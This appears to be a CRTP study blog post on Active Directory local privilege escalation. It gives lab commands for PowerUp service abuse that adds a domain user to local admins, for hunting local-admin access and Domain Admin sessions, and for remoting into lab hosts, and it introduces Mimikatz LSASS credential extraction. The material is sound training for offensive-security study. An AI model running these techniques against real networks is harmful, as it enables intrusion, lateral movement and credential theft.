---
layout: post
title: Active Directory (AD) | Local Privilege Escalation
date: 2024-06-25 7:40:00 +0800
categories: [Cert, CRTP]
tags: [Cert, Active Directory]     # TAG names should always be lowercase
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---


# 1. Local Privilege Escalation

 **In Active Directory Environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:**
 
 - Hunting for Local Admin access on other machines
 - Hunting for high privilege domain accounts (like a Domain Administrator)
 - **Example Scenario :** I have local admin access on a machine **-->** A Domain Admin has a session on that machine **-->** I steal his token and impersonate him **-->** Profit!
s
 **There are various ways of locally escalting privilege on Windows:**
 
 - Missing Patches
 - Automated Deployment and AutoLogon password in clear text
 - AlwaysInstallElevated (Any user can run MSI on SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more
 - NTLM Relaying a.k.a Wont’t Fix
 - NTLM Relaying example - https://github.com/antonioCoco/RemotePotato0

 **We can use below tools for complete coverage:**
 
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - https://github.com/enjoiz/Privesc
 - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY

# 2. Check for any privilege escalation path - PowerUp

First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.

{: .prompt-info }
```bash
#Check for any priviliege escalation path
Invoke-AllChecks

#Abuse the service and add our current domain user to the local Administrator group
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```

# 3. Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1

Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 

{: .prompt-info }
```bash
#Identify a computer within the network domain where the user has local admin privileges.
Find-PSRemotingLocalAdminAccess
```

We can connect to the machine who has the local administrative access by using winrs
{: .prompt-info }
```bash
winrs -r:dcorp-adminsrv cmd

#Checking the username and computername in the remote winrs session
set username
set computername
```

We can also use PowerShell Remoting
{: .prompt-info }
```bash
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

# 4. Identify a machine in the domain where a Domain Admin session is available - PowerView

A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.
{: .prompt-info }
```bash
Find-DomainUserLocation
```

# 5. Extract Credentials from LSASS using Mimikatz

Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**

Pass The Hash